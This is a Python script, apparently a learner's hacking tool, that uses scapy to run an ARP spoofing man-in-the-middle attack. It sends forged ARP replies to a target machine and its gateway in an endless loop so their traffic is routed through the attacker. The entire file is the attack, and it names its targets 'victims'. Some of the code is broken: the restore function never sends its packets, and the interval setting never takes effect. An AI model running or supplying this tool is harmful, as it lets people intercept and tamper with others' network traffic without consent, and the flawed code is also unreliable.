#! usr/bin/python
import argparse
import time

import scapy.all as scapy


def capture_ips():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target machine IP address.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway or Router IP address.")
    parser.add_argument("-i", "--time", dest="time_interval", help="Set time interval for packets. Default 0.5s.")
    victims = parser.parse_args()
    if not victims.target_ip or not victims.gateway_ip:
        parser.error("[-] Please specify both a target and a gateway, use --help for info")
    return victims


class ArpSpoof:
    def __init__(self, targets):
        self.time_interval = 0.5
        self.targets = targets
        if self.targets:
            self.target_mac = ""
            self.middle_man(self.targets.target_ip, self.targets.gateway_ip)
        if self.targets.time_interval:
            self.time_interval = self.targets.time_interval

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast_mac / arp_request
        try:
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except Exception as e:
            print("[-] Error getting mac address ... retrying.\n")
            print(e)
            self.get_mac(ip)

    def arp_spoof(self, target_ip, spoof_ip):
        if self.target_mac == "":
            self.target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=self.get_mac(destination_ip),
                           psrc=source_ip, hwsrc=self.get_mac(source_ip))

    def middle_man(self, target_ip, gateway_ip):
        try:
            sent_packets_count = 0
            while True:
                self.arp_spoof(target_ip, gateway_ip)
                self.arp_spoof(gateway_ip, target_ip)
                sent_packets_count = sent_packets_count + 2
                print("[+] Packets sent: " + str(sent_packets_count))
                time.sleep(self.time_interval)
        except KeyboardInterrupt:
            print("\n[+] Detected CTRL+C, resetting ARP tables now.\n")
            self.restore(target_ip, gateway_ip)
            self.restore(gateway_ip, target_ip)


target = capture_ips()
if target:
    spoofer = ArpSpoof(target)
